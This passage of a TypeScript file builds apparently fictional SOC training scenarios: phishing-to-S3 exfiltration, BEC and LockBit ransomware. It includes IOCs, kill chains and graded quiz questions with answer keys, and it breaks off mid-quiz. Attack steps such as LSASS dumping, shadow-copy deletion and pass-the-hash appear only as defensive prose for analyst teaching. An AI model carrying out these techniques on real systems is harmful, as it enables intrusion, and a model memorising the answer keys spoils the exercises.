/**
 * SOC Training Platform — Scenario Builders
 * Each scenario produces 10-12 curated, story-driven telemetry events that
 * give a student exactly the clues needed to investigate the attack chain.
 * Events have rich human-readable `description` fields shown in the log viewer.
 */
import type { Alert, IOC, ScenarioBundle, ScenarioQuestion, Severity, TelemetryEvent } from "./types";
import { makeSha256 } from "./iocs";
import { buildBackupFalsePositiveScenario } from "./scenario-packs/backupFalsePositive";
import { buildWebShellRceScenario }         from "./scenario-packs/webShellRce";
import { buildLinuxSshPersistenceScenario } from "./scenario-packs/linuxSshPersistence";
import { buildAitmTokenTheftScenario }      from "./scenario-packs/aitmTokenTheft";
import { buildEsxiRansomwareScenario }      from "./scenario-packs/esxiRansomware";
import { buildBruteForceSingleAccountScenario } from "./scenario-packs/bruteForceSingleAccount";
import { buildOktaPasswordBurstScenario }    from "./scenario-packs/oktaPasswordBurst";
import { buildFakeBrowserUpdateScenario }    from "./scenario-packs/fakeBrowserUpdate";
import { buildTrojanizedInstallerKeyloggerScenario } from "./scenario-packs/trojanizedInstallerKeylogger";
import { buildMultiHostIntrusionScenario } from "./scenario-packs/multiHostIntrusion";
import { buildAiLlmJackingScenario } from "./scenario-packs/aiLlmJacking";
import { buildGwsPhishingAttachmentScenario } from "./scenario-packs/gwsPhishingAttachment";
import { buildSeoPoisonedInstallerScenario }     from "./scenario-packs/seoPoisonedInstaller";
import { buildIsoContainerSmugglingScenario }    from "./scenario-packs/isoContainerSmuggling";
import { buildClickFixFakeCaptchaScenario }      from "./scenario-packs/clickFixFakeCaptcha";
import { buildScheduledTaskPersistenceScenario } from "./scenario-packs/scheduledTaskPersistence";
import { buildRogueAdminAccountScenario }   from "./scenario-packs/rogueAdminAccount";
import { buildImpossibleTravelBasicScenario } from "./scenario-packs/impossibleTravelBasic";
import { buildSoftwareInstallFalsePositiveScenario } from "./scenario-packs/softwareInstallFalsePositive";
// P0 attack-coverage additions (docs/live-feed-attack-coverage-review.md)
import { buildInfostealerSessionTheftScenario } from "./scenario-packs/infostealerSessionTheft";
import { buildEdgeVpnCveExploitScenario }        from "./scenario-packs/edgeVpnCveExploit";
import { buildExfilFirstExtortionScenario }      from "./scenario-packs/exfilFirstExtortion";
import { buildHelpdeskMfaResetScenario }         from "./scenario-packs/helpdeskMfaReset";
import { buildWindowsPrivescTokenScenario }      from "./scenario-packs/windowsPrivescToken";
import { buildLinuxPrivescSuidScenario }         from "./scenario-packs/linuxPrivescSuid";
import { buildLateralMovementPthScenario }       from "./scenario-packs/lateralMovementPth";
import { buildInsiderDlpUsbCloudScenario }       from "./scenario-packs/insiderDlpUsbCloud";
import { buildNacRogueDeviceScenario }           from "./scenario-packs/nacRogueDevice";
import { buildMacosStealerDmgScenario }          from "./scenario-packs/macosStealerDmg";
import { buildSqliDbExfilScenario }              from "./scenario-packs/sqliDbExfil";
import { buildAzureManagedIdentityAbuseScenario } from "./scenario-packs/azureManagedIdentityAbuse";
import { buildCicdSupplyChainScenario }          from "./scenario-packs/cicdSupplyChain";
import { buildUebaCompromisedAccountScenario }   from "./scenario-packs/uebaCompromisedAccount";
import { buildVishingRmmScenario }               from "./scenario-packs/vishingRmm";
import { buildPamVaultAbuseScenario }            from "./scenario-packs/pamVaultAbuse";
import { buildDestructiveWiperScenario }         from "./scenario-packs/destructiveWiper";
import { buildS3ExfilExposureScenario }          from "./scenario-packs/s3ExfilExposure";
import { buildGoldenSamlScenario }               from "./scenario-packs/goldenSaml";
import { buildGwsOauthMarketplaceScenario }      from "./scenario-packs/gwsOauthMarketplace";
import { buildThreatIntelHuntScenario }          from "./scenario-packs/threatIntelHunt";
import { buildMobileMdmCompromiseScenario }      from "./scenario-packs/mobileMdmCompromise";
import { buildGcpSaKeyTheftScenario }            from "./scenario-packs/gcpSaKeyTheft";
import { buildMacosTccPkgScenario }              from "./scenario-packs/macosTccPkg";
import { buildEmailBombHelpdeskScenario }        from "./scenario-packs/emailBombHelpdesk";
import { buildOtNetworkAnomalyScenario }         from "./scenario-packs/otNetworkAnomaly";
import { buildBecWireFraudScenario }             from "./scenario-packs/becWireFraud";
import {
  phishingToExfilEvents,
  becScenarioEvents,
  ransomwareScenarioEvents,
  oauthScenarioEvents,
  insiderThreatScenarioEvents,
  impossibleTravelScenarioEvents,
  cloudKeyLeakS3ExfilScenarioEvents,
  dcSyncScenarioEvents,
  supplyChainScenarioEvents,
  mfaFatigueScenarioEvents,
  asRepRoastingScenarioEvents,
  ntlmRelayScenarioEvents,
  k8sPodEscapeScenarioEvents,
  oauthConsentPhishingScenarioEvents,
  kerberoastingScenarioEvents,
  dnsTunnelingScenarioEvents,
  lolBinsScenarioEvents,
  phishingMalwareScenarioEvents,
  usbMalwareScenarioEvents,
  browserExtensionMalwareScenarioEvents,
  techSupportScamScenarioEvents,
  crackedSoftwareScenarioEvents,
  maliciousMacroScenarioEvents,
} from "./scenarioEvents";

// ─── Alert auto-generator ────────────────────────────────────────────────────

// Build the alert's title + description from the EVENT'S OWN OBSERVABLES — never a
// per-technique template (which could contradict the event it points at: the old
// generator stamped "macro Office document" on a .pdf.exe ZIP, and "PowerShell
// beacon" where no PowerShell existed) and never the analyst's prose conclusion
// (that is the exercise — see F-02). An alert states what the tool SAW, grounded
// in the same structured observables the analyst reads on the event row, so it can
// never disagree with its own event.
function alertTextFromEvent(e: TelemetryEvent): { title: string; description: string } {
  const vendor = e.vendor ?? e.source.toUpperCase();
  const host = e.hostname ? ` on ${e.hostname}` : "";
  const p = e.process;
  const n = e.network;
  if (p?.name) {
    const parent = p.parent_name ? ` (child of ${p.parent_name})` : "";
    return {
      title: `${vendor} flagged process ${p.name}${host}`,
      description: `${vendor} raised a detection on ${p.name}${parent}${host}${p.cmdline ? ` — command line: ${p.cmdline}` : ""}.`,
    };
  }
  if (n?.domain) {
    return {
      title: `${vendor}: outbound connection to ${n.domain}${host}`,
      description: `${vendor} flagged a connection to ${n.domain}${e.dst_ip ? ` (${e.dst_ip})` : ""}${host}.`,
    };
  }
  if (n?.url) {
    let hostPart = n.url;
    try { hostPart = new URL(n.url).host; } catch { /* keep the raw url */ }
    return {
      title: `${vendor}: web request to ${hostPart}${host}`,
      description: `${vendor} flagged a web request to ${n.url}${host}.`,
    };
  }
  if (e.file?.path) {
    return {
      title: `${vendor}: file activity — ${e.file.path}${host}`,
      description: `${vendor} flagged file activity on ${e.file.path}${host}${e.file.sha256 ? ` (sha256 ${e.file.sha256})` : ""}.`,
    };
  }
  const et = e.event_type.replace(/_/g, " ");
  if (e.user_email && /auth|login|logon|sign|account|mfa|token/i.test(e.event_type)) {
    return {
      title: `${vendor}: ${et} — ${e.user_email}${e.src_ip ? ` from ${e.src_ip}` : ""}`,
      description: `${vendor} recorded ${et} for ${e.user_email}${e.src_ip ? ` from ${e.src_ip}` : ""}${host}.`,
    };
  }
  return {
    title: `${vendor} detection: ${et}${host}`,
    description: `${vendor} raised a ${e.severity ?? "medium"} detection (${et})${host}.`,
  };
}

export function eventsToAlerts(events: TelemetryEvent[], scenario_id: string): Alert[] {
  const alerts: Alert[] = [];
  let aid = 0;
  // Builders declare events in narrative order, which is not always
  // chronological — several scenarios listed a tool launch after the traffic it
  // produced. Alerts must run on the clock, so sort a copy here rather than
  // relying on every builder to keep its array ordered.
  const ordered = [...events].sort((a, b) => new Date(a.ts).getTime() - new Date(b.ts).getTime());
  for (const e of ordered) {
    if (!e.mitre_technique) continue;
    if (!e.severity || e.severity === "informational" || e.severity === "low") continue;
    aid += 1;
    const sevToConf: Record<Severity, number> = { critical: 95, high: 86, medium: 72, low: 55, informational: 30 };
    const sevToRisk: Record<Severity, number> = { critical: 92, high: 78, medium: 60, low: 40, informational: 15 };
    const tactic = tacticForTechnique(e.mitre_technique);
    alerts.push({
      id: `alt_${scenario_id.slice(0, 6)}_${aid}`,
      alert_uid: vendorAlertId(e.vendor ?? e.source, scenario_id, aid),
      ...alertTextFromEvent(e),
      source: e.source, vendor: e.vendor ?? e.source.toUpperCase(),
      severity: e.severity,
      status: "new",
      confidence: sevToConf[e.severity],
      risk_score: sevToRisk[e.severity],
      mitre_tactic: tactic, mitre_technique: e.mitre_technique,
      hostname: e.hostname, user_email: e.user_email,
      src_ip: e.src_ip, dst_ip: e.dst_ip,
      process: e.process ? { name: e.process.name, cmdline: e.process.cmdline, parent: e.process.parent_name, sha256: e.file?.sha256 } : undefined,
      url: e.network?.url, domain: e.network?.domain,
      detected_at: e.ts,
      related_events: [e.id],
    });
  }
  return alerts;
}

function vendorAlertId(vendor: string, scenarioId: string, n: number): string {
  const v = vendor.toLowerCase();
  const tag = v.includes("crowd") ? "CRWD" : v.includes("sentinel") || v.includes("microsoft") ? "MDE" :
    v.includes("splunk") ? "SPL" : v.includes("palo") ? "PAN" : v.includes("okta") ? "OKTA" :
    v.includes("aws") || v.includes("cloudtrail") ? "AWS" : v.includes("sysmon") ? "SYSMON" : "SIEM";
  const h = n.toString(16).toUpperCase().padStart(8, "0");
  return `${tag}-${h}`;
}


function tacticForTechnique(t: string): string | undefined {
  if (t.startsWith("T1566")) return "TA0001";
  if (t.startsWith("T1091")) return "TA0001";   // Initial Access (replication through removable media)
  if (t.startsWith("T1176")) return "TA0003";   // Persistence (browser extensions, incl. T1176.001)
  if (t.startsWith("T1219")) return "TA0011";   // Command and Control (remote access software, incl. T1219.002)
  if (t.startsWith("T1059")) return "TA0002";
  if (t.startsWith("T1547") || t.startsWith("T1543")) return "TA0003";
  if (t.startsWith("T1218") || t.startsWith("T1027") || t.startsWith("T1562")) return "TA0005";
  if (t.startsWith("T1003") || t.startsWith("T1110") || t.startsWith("T1555")) return "TA0006";
  if (t.startsWith("T1021")) return "TA0008";
  if (t.startsWith("T1569")) return "TA0002";
  if (t.startsWith("T1071")) return "TA0011";
  if (t.startsWith("T1567") || t.startsWith("T1041") || t.startsWith("T1052")) return "TA0010";
  if (t.startsWith("T1486") || t.startsWith("T1490")) return "TA0040";
  if (t.startsWith("T1098")) return "TA0003";
  if (t.startsWith("T1114") || t.startsWith("T1530")) return "TA0009";
  if (t === "T1078") return "TA0001";
  if (t.startsWith("T1087") || t.startsWith("T1046") || t.startsWith("T1057")) return "TA0007";
  if (t.startsWith("T1558")) return "TA0006";
  if (t.startsWith("T1105")) return "TA0011";
  if (t.startsWith("T1218") || t.startsWith("T1197")) return "TA0005";
  if (t.startsWith("T1053")) return "TA0003";
  if (t.startsWith("T1552")) return "TA0006";   // Credential Access
  if (t === "T1078.004") return "TA0001";        // Initial Access (valid cloud accounts)
  if (t.startsWith("T1580")) return "TA0007";   // Discovery
  if (t.startsWith("T1578")) return "TA0005";   // Defense Evasion / Resource Development
  if (t === "T1136.003") return "TA0003";        // Persistence (cloud account created)
  if (t === "T1098.001") return "TA0003";        // Persistence (account manipulation)
  if (t.startsWith("T1496")) return "TA0040";   // Impact (resource hijacking)
  if (t.startsWith("T1136")) return "TA0003";   // Persistence (account creation)
  if (t.startsWith("T1070")) return "TA0005";   // Defense Evasion (log clearing)
  if (t.startsWith("T1195")) return "TA0001";   // Initial Access (supply chain)
  if (t === "T1083") return "TA0007";           // Discovery (file search)
  if (t.startsWith("T1036")) return "TA0005";   // Defense Evasion (masquerading)
  if (t === "T1621")        return "TA0006";   // Credential Access (MFA fatigue)
  if (t === "T1558.004")    return "TA0006";   // Credential Access (AS-REP Roasting)
  if (t === "T1557.001")    return "TA0009";   // Collection (LLMNR/NTLM relay)
  if (t === "T1610")        return "TA0002";   // Execution (deploy container)
  if (t === "T1611")        return "TA0004";   // Privilege Escalation (escape to host)
  if (t === "T1552.005")    return "TA0006";   // Credential Access (IMDS)
  if (t === "T1528")        return "TA0006";   // Credential Access (steal app token)
  if (t === "T1137.005")    return "TA0003";   // Persistence (Outlook rules)
  if (t === "T1114.003")    return "TA0009";   // Collection (email forwarding rule)
  if (t === "T1078.002")    return "TA0001";   // Initial Access (domain accounts) — matches T1078/.004 above; ATT&CK does not list Lateral Movement for T1078
  if (t === "T1550.003")    return "TA0008";   // Lateral Movement (pass the ticket)
  if (t === "T1204.002")    return "TA0002";   // Execution (user opens malicious file)
  if (t === "T1219")        return "TA0011";   // Command and Control (remote access software)
  if (t === "T1176")        return "TA0003";   // Persistence (browser extensions)
  if (t === "T1566.002")    return "TA0001";   // Initial Access (spearphishing link)
  if (t === "T1556.009")    return "TA0006";   // Credential Access (modify conditional access policies)
  return undefined;
}

// =========================================================================
// Scenario 1: Phishing macro → AWS key theft → S3 download
// =========================================================================

export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioBundle {
  const { title, events, T, MIN, victim, c2Domain, c2Ip, attackerIp, senderIp, dllHash } = phishingToExfilEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "domain",  value: c2Domain,                        reputation: "malicious",  tags: ["c2", "newly-registered"] },
    { type: "ip",      value: c2Ip,                            reputation: "malicious",  tags: ["c2"] },
    { type: "ip",      value: attackerIp,                      reputation: "malicious",  tags: ["aws-key-use", "s3-download"] },
    { type: "ip",      value: senderIp,                        reputation: "malicious",  tags: ["phishing-sender"] },
    { type: "sha256",  value: dllHash,                         reputation: "malicious",  tags: ["dropper", "dll", "stage1"] },
    { type: "email",   value: "support@nexacorp-vendor.xyz",   reputation: "malicious",  tags: ["phishing", "sender"] },
    { type: "user",    value: victim.email,                    reputation: "suspicious", tags: ["victim", "compromised"] },
    { type: "host",    value: victim.hostname,                 reputation: "unknown", tags: ["patient-zero"] },
  ];

  const killchain = [
    { ts: T(5 * MIN),          phase: "Initial Access",          action: "Phishing email 'Invoice_Q3_Final.docm' delivered — SPF/DKIM/DMARC failed, a keyword transport rule allowed it" },
    { ts: T(5 * MIN + 31_000), phase: "Execution",               action: "WINWORD.EXE spawns hidden PowerShell (execution policy bypass); Falcon raises a detection, no action" },
    { ts: T(5 * MIN + 42_000), phase: "Command & Control",       action: "The same PowerShell process resolves 3-day-old cdn-update-fb76.xyz and connects to it over HTTPS" },
    { ts: T(8 * MIN),          phase: "Persistence",             action: "svchost32.dll dropped to %TEMP%; HKCU Run key 'WindowsUpdater' created" },
    { ts: T(38 * MIN),         phase: "Credential Access",       action: "PowerShell (PID 5512) opens C:\\Users\\jsmith\\.aws\\credentials" },
    { ts: T(40 * MIN),         phase: "Discovery",               action: "Access key AKIA4XJ9PQ2M7EXAMPLE calls GetCallerIdentity from an external IP" },
    { ts: T(43 * MIN),         phase: "Collection",              action: "Same key reads exports/customer-financial-data-2026.zip (184 MB) from nexacorp-crm-exports" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Which MITRE technique best describes the initial access vector used in this attack?", kind: "single",
      options: [
        { value: "T1566.001", label: "T1566.001 — Spearphishing Attachment (.docm macro)" },
        { value: "T1190",     label: "T1190 — Exploit Public-Facing Application (web/VPN flaw)" },
        { value: "T1078",     label: "T1078 — Valid Accounts (reused finance credentials)" },
        { value: "T1133",     label: "T1133 — External Remote Services (VPN/Citrix gateway)" },
      ],
      answer: "T1566.001", xp: 50,
      explanation: "A macro-enabled Word document (.docm) was delivered via phishing email. When the user enabled macros, Office spawned PowerShell — this is T1566.001 Spearphishing Attachment. The SPF/DKIM/DMARC bypass via transport rule is a delivery bypass, not the technique itself." },
    { id: "q2", prompt: "What is the parent process of the malicious powershell.exe in event evt_04?", kind: "single",
      options: [
        { value: "OUTLOOK.EXE", label: "OUTLOOK.EXE — Outlook email client" },
        { value: "WINWORD.EXE", label: "WINWORD.EXE — Microsoft Word client" },
        { value: "explorer.exe", label: "explorer.exe — Windows desktop shell" },
        { value: "svchost.exe",  label: "svchost.exe — Windows service host" },
      ],
      answer: "WINWORD.EXE", xp: 50,
      explanation: "WINWORD.EXE spawning powershell.exe is the canonical Office macro execution pattern. A Word process should never legitimately spawn PowerShell — this parent-child relationship alone should trigger an immediate alert." },
    { id: "q3", prompt: "Which TWO artifacts together form the persistence mechanism on WS-FIN-2847?", kind: "multi",
      options: [
        { value: "run_key", label: "HKCU Run key 'WindowsUpdater' → rundll32 + svchost32.dll" },
        { value: "aws",     label: "The AWS CLI profile C:\\Users\\jsmith\\.aws\\credentials" },
        { value: "dll",     label: "svchost32.dll dropped to C:\\Users\\jsmith\\AppData\\Local\\Temp\\" },
        { value: "docm",    label: "Invoice_Q3_Final.docm in the Downloads folder" },
      ],
      answer: ["run_key", "dll"], xp: 75,
      explanation: "The DLL is the payload; the Run key is the autorun trigger. Together they ensure the implant survives reboots. The AWS profile is the credential that was read (credential access), not persistence. The .docm is the delivery vehicle — it only runs when a user opens it again." },
    { id: "q4", prompt: "What single containment action best stops the active threat on WS-FIN-2847 immediately?", kind: "single",
      options: [
        { value: "isolate",  label: "Network-isolate the endpoint via EDR console" },
        { value: "reboot",   label: "Reboot the endpoint to kill the beacon process" },
        { value: "block_ip", label: "Block the C2 IP at the perimeter firewall only" },
        { value: "warn",     label: "Send j.smith a security awareness reminder email" },
      ],
      answer: "isolate", xp: 50,
      explanation: "EDR network isolation severs all connections (C2, lateral) while preserving memory and disk for forensics. Rebooting kills the process but the Run key re-executes it on next logon. Blocking a single IP fails because the attacker can rotate IPs. Email warning doesn't address an active compromise." },
    { id: "q5", prompt: "Isolating WS-FIN-2847 does not stop the S3 access. Which action closes it?", kind: "single",
      options: [
        { value: "deactivate_key", label: "Deactivate access key AKIA4XJ9PQ2M7EXAMPLE (jsmith-analytics) and review its CloudTrail activity" },
        { value: "reset_ad",       label: "Reset j.smith's Active Directory password" },
        { value: "block_domain",   label: "Sinkhole cdn-update-fb76.xyz at the DNS resolver" },
        { value: "delete_bucket",  label: "Delete the nexacorp-crm-exports bucket" },
      ],
      answer: "deactivate_key", xp: 75,
      explanation: "GetCallerIdentity (evt_11c) and GetObject (evt_12) were signed with the long-term IAM access key read from the workstation's AWS profile (evt_11b), from an external IP. That key works from anywhere, independent of the endpoint and of the AD password, so it must be deactivated (then rotated) and its full CloudTrail history reviewed for other reads. Sinkholing the domain stops the beacon, not the key; deleting the bucket destroys evidence and business data." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "TA-COBALTSPIDER (financially motivated)",
    attack_kind: "phishing_to_exfil",
    briefing: "CrowdStrike raised a high-severity detection on WS-FIN-2847 (j.smith) at 09:47 — Word launched a hidden PowerShell. The detection was 'detect only' and has sat unassigned for an hour.",
    narrative: `At 09:47, a finance analyst at NexaCorp Industries received what appeared to be a routine vendor invoice. The macro-enabled Word attachment failed SPF, DKIM and DMARC but was delivered anyway by a keyword transport rule. Moments after the document was opened, Word spawned a hidden PowerShell process; Falcon flagged it but took no action. The same process resolved a 3-day-old domain, connected to it, dropped a DLL into %TEMP% and wrote a Run key for persistence. Half an hour later it opened the user's AWS CLI profile — and two minutes after that, the long-term access key stored there was used from an external IP to check its identity and download a 184 MB customer financial export from S3. Your job: trace the chain from the email to the bucket, identify the persistence mechanism, and decide which containment actions stop both the endpoint and the cloud access.`,
    learning_objectives: [
      "Identify spearphishing delivery and recognize SPF/DKIM/DMARC bypass techniques",
      "Trace the Office macro → PowerShell → C2 execution chain using process trees",
      "Distinguish endpoint persistence mechanisms (Registry Run keys + DLL drops)",
      "Link a credential-file read on an endpoint to the cloud API calls signed with that key",
      "Contain both halves of a hybrid incident: isolate the host AND deactivate the cloud key",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 2: Password Spray → BEC Mailbox Rule
// =========================================================================

export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle {
  const { title, events, T, MIN, victim, attackerIp, sprayIp } = becScenarioEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "ip",    value: sprayIp,                       reputation: "malicious",  tags: ["spray", "netherlands"] },
    { type: "ip",    value: attackerIp,                    reputation: "malicious",  tags: ["attacker", "bec"] },
    { type: "email", value: "l.harris.backup@gmail.com",   reputation: "suspicious", tags: ["exfil-target", "personal"] },
    { type: "user",  value: victim.email,                  reputation: "suspicious", tags: ["victim", "compromised"] },
  ];

  const killchain = [
    { ts: T(0),        phase: "Credential Access",        action: "Password spray — 47 failures across 14 accounts from 158.131.159.30" },
    { ts: T(12 * MIN), phase: "Initial Access",           action: "l.harris accepted MFA push at 02:12 from Netherlands — account compromised" },
    { ts: T(13 * MIN), phase: "Defense Evasion / Concealment", action: "Hidden inbox rule '..' diverts wire/invoice/payment mail to RSS Feeds, marked read" },
    { ts: T(15 * MIN), phase: "Collection",               action: "340 emails scraped in 2 minutes — attacker profiles payment workflows" },
    { ts: T(20 * MIN), phase: "Persistence",              action: "Auto-forward to personal gmail — persistent copy of all inbound mail" },
    { ts: T(25 * MIN), phase: "Impact",                   action: "$247K wire fraud email sent to CFO from compromised account" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "What is the PRIMARY intent of the hidden inbox rule named '..'?", kind: "single",
      options: [
        { value: "bec",      label: "Hide wire-fraud replies from the victim to facilitate BEC fraud" },
        { value: "persist",  label: "Maintain persistent mailbox access that survives a password reset" },
        { value: "archival", label: "Personal email archiving that the user set up to tidy their inbox" },
        { value: "spam",     label: "Anti-spam routing that moves the flagged mail out of the inbox" },
      ],
      answer: "bec", xp: 75,
      explanation: "The rule filters wire/invoice/banking/payment emails into a hidden folder. This prevents the real l.harris from seeing that a fraudulent wire transfer was requested and confirmed — the classic BEC playbook. The Unicode dot name (..) makes it invisible in the standard Outlook UI." },
    { id: "q2", prompt: "Which MITRE techniques are present in this incident? (select all that apply)", kind: "multi",
      options: [
        { value: "T1110.003", label: "T1110.003 — Password Spraying" },
        { value: "T1078",     label: "T1078 — Valid Accounts (MFA fatigue bypass)" },
        { value: "T1564.008", label: "T1564.008 — Hide Artifacts: Email Hiding Rules" },
        { value: "T1486",     label: "T1486 — Data Encrypted for Impact (files encrypted on the workstation for ransom)" },
      ],
      answer: ["T1110.003", "T1078", "T1564.008"], xp: 100,
      explanation: "T1110.003 (password spray), T1078 (valid account via MFA fatigue), and T1564.008 (hidden inbox rule) are all present. There is no ransomware — this is purely an identity/BEC attack." },
    { id: "q3", prompt: "The CFO (p.johnson) received 8 MFA push notifications in 5 minutes. What attack technique is this?", kind: "single",
      options: [
        { value: "fatigue", label: "MFA fatigue (push prompt bombing) — T1621" },
        { value: "bypass",  label: "MFA bypass via SIM swapping (SMS codes)" },
        { value: "replay",  label: "MFA token replay with a stolen session cookie" },
        { value: "phish",   label: "Real-time phishing proxy (Evilginx AiTM)" },
      ],
      answer: "fatigue", xp: 50,
      explanation: "Sending rapid MFA push notifications hoping the user accidentally or frustratingly approves one is called MFA fatigue or prompt bombing (T1621). The CFO correctly rejected all 8 and reported to IT — an example of good security awareness." },
    { id: "q4", prompt: "Revoking l.harris's session tokens alone does NOT fully stop the attacker. Why?", kind: "single",
      options: [
        { value: "forward", label: "The email forwarding rule to gmail.com continues delivering mail without an active session" },
        { value: "cache",   label: "Outlook keeps a cached copy of the session token that survives revocation until the client is restarted" },
        { value: "oauth",   label: "A malicious OAuth application was consented to in the tenant and holds its own refresh token" },
        { value: "backup",  label: "The attacker created a second global admin account that keeps working after l.harris is locked out" },
      ],
      answer: "forward", xp: 75,
      explanation: "The auto-forwarding rule (Set-Mailbox) was configured at the Exchange transport level — it continues forwarding all inbound email to the attacker's gmail address indefinitely, even after the active session is revoked. Both the session revocation AND the forwarding/inbox rules must be removed." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "TA-VOIDPELICAN (Business Email Compromise operator)",
    attack_kind: "identity_bec",
    briefing: "Entra ID flagged 47 failed sign-ins against NexaCorp accounts from a single external address just after 08:00, and a.nelson and r.garcia both locked out. At 08:31 CFO p.johnson called the help desk to report unexpected prompts on his phone.",
    narrative: `Over a 4-minute window at 08:00, 47 authentication failures hit Finance and Executive accounts from a single Dutch IP — deliberately staying under the 5-attempt lockout threshold on most accounts. At 08:12, l.harris accepted an MFA push at 02:12 local time. Within a minute the attacker had created a hidden inbox rule intercepting all wire/invoice/payment emails, then over the next several minutes scraped 340 emails to profile payment workflows and enabled forwarding to a personal gmail address. At 08:25 a fraudulent $247K wire transfer request landed in the CFO's inbox. The CFO also received 8 MFA push notifications in 5 minutes — a fatigue attack to compromise the payment approver too. Your job: reconstruct the attack chain, separate what HIDES the fraud from what OUTLIVES the session, and determine why revoking the session isn't enough.`,
    learning_objectives: [
      "Identify password spraying by recognizing below-threshold multi-account failure patterns",
      "Understand MFA fatigue (prompt bombing) and why push notifications are exploitable",
      "Detect hidden Exchange inbox rules used for Business Email Compromise interception",
      "Understand why session revocation alone is insufficient when forwarding rules exist",
      "Prioritize containment steps for an active BEC incident",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 3: Ransomware Outbreak — LockBit 3.0
// =========================================================================

export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"): ScenarioBundle {
  const { title, events, T, MIN, zero, server, c2Ip, c2Dom, rswHash, psxHash } = ransomwareScenarioEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "domain", value: c2Dom,                           reputation: "malicious",  tags: ["c2", "cobalt-strike"] },
    { type: "ip",     value: c2Ip,                            reputation: "malicious",  tags: ["c2"] },
    { type: "sha256", value: rswHash,                         reputation: "malicious",  tags: ["lockbit3", "ransomware"] },
    { type: "sha256", value: psxHash,                         reputation: "suspicious", tags: ["psexec", "lateral"] },
    { type: "email",  value: "payroll@nexacorp-updates.net",  reputation: "malicious",  tags: ["phishing"] },
    { type: "host",   value: zero.hostname,                   reputation: "unknown", tags: ["patient-zero"] },
    { type: "host",   value: server.hostname,                 reputation: "unknown", tags: ["encrypted", "lateral-target"] },
    { type: "user",   value: zero.email,                      reputation: "suspicious", tags: ["victim"] },
  ];

  const killchain = [
    { ts: T(0),          phase: "Initial Access",              action: "Phishing 'Salary_Adjustment_Notice.docm' delivered — keyword whitelist bypass" },
    { ts: T(45_000),     phase: "Execution",                   action: "WINWORD macro spawns hidden PowerShell (execution policy bypass) → Cobalt Strike stage-1 loader" },
    { ts: T(3 * MIN),    phase: "Command & Control",           action: "Cobalt Strike HTTPS beacon to edge-cdn-updates.xyz every 60s" },
    { ts: T(87 * MIN),   phase: "Privilege Escalation",         action: "fodhelper UAC bypass — beacon gains a High-integrity token" },
    { ts: T(90 * MIN),   phase: "Credential Access",           action: "LSASS dumped via comsvcs.dll — domain admin hash extracted" },
    { ts: T(105 * MIN),  phase: "Lateral Movement",            action: "Pass-the-hash SMB to FS-CORP-01 ADMIN$ — PsExec deployed" },
    { ts: T(120 * MIN),  phase: "Impact — Recovery Inhibition", action: "vssadmin deletes all 12 shadow copies — recovery prevented" },
    { ts: T(121 * MIN),  phase: "Defense Evasion",              action: "Security, System and Application logs cleared — Event 1102 survives" },
    { ts: T(123 * MIN),  phase: "Impact — Encryption",         action: "LockBit 3.0 encrypts 2,847 files (18GB) across Finance, HR, Contracts shares" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Which host is 'patient zero' — the first infected machine?", kind: "single",
      options: [
        { value: "zero",   label: `${zero.hostname} (${zero.email}) — finance workstation` },
        { value: "server", label: `${server.hostname} — the file server where encryption was first detected` },
        { value: "dc",     label: "DC-CORP-01 — the domain controller that issued the attacker's TGT" },
        { value: "unknown", label: "Cannot be determined — the Security and System logs were cleared" },
      ],
      answer: "zero", xp: 50,
      explanation: `${zero.hostname} is patient zero: it received the phishing email, executed the macro, established the C2 beacon, and performed the LSASS dump. ${server.hostname} was only compromised later via PsExec lateral movement from WS-FIN-1193.` },
    { id: "q2", prompt: "Which MITRE technique describes the lateral movement from WS-FIN-1193 to FS-CORP-01?", kind: "single",
      options: [
        { value: "T1021.002", label: "T1021.002 — SMB/Windows Admin Shares (pass-the-hash + PsExec)" },
        { value: "T1078",     label: "T1078 — Valid Accounts (reused plaintext admin password)" },
        { value: "T1021.001", label: "T1021.001 — Remote Desktop Protocol (interactive admin session)" },
        { value: "T1105",     label: "T1105 — Ingress Tool Transfer (pulling LockBit from the C2 server)" },
      ],
      answer: "T1021.002", xp: 50,
      explanation: "PSEXESVC.exe was deployed over SMB to the ADMIN$ share using a stolen domain admin NTLM hash (pass-the-hash). This is T1021.002 — SMB/Windows Admin Shares combined with a pass-the-hash technique. RDP was not used." },
    { id: "q3", prompt: "Why did the attacker run vssadmin BEFORE starting encryption?", kind: "single",
      options: [
        { value: "inhibit",  label: "Destroy shadow copies so the victim cannot roll files back without paying (T1490)" },
        { value: "exfil",    label: "To export the shadow copy contents to their C2 server before encrypting the originals" },
        { value: "persist",  label: "To create a clean VSS snapshot they can restore from if they need to re-enter later" },
        { value: "escalate", label: "To escalate from local admin to SYSTEM by abusing the Volume Shadow Copy service" },
      ],
      answer: "inhibit", xp: 75,
      explanation: "Deleting Volume Shadow Copies (T1490 — Inhibit System Recovery) prevents the victim from using Windows built-in recovery to restore encrypted files. Without shadow copies or an external backup, the victim's only options are pay the ransom or restore from an offline backup — if one exists." },
    { id: "q4", prompt: "The CrowdStrike prevention policy was set to 'Detection Only' on servers. What should it have been, and what would that have changed?", kind: "single",
      options: [
        { value: "prevent",  label: "Prevention — the ransomware binary would have been blocked before encrypting any files" },
        { value: "monitor",  label: "Monitor — collects richer telemetry for the SOC to act on, but still without blocking" },
        { value: "disabled", label: "Disabled — file servers should not run EDR prevention because of the I/O performance impact" },
        { value: "detection", label: "Detection Only is correct — automatic blocking causes too many false positives on servers" },
      ],
      answer: "prevent", xp: 75,
      explanation: "The sensor did detect it — the detection record is right there in the feed. What stopped it from acting was the policy: with prevention disabled on this server it can only log what it sees. Setting Prevention on servers would have blocked the payload before encryption began. 'Detection Only' is a common server misconfiguration driven by availability fears, and here it cost the whole file server." },
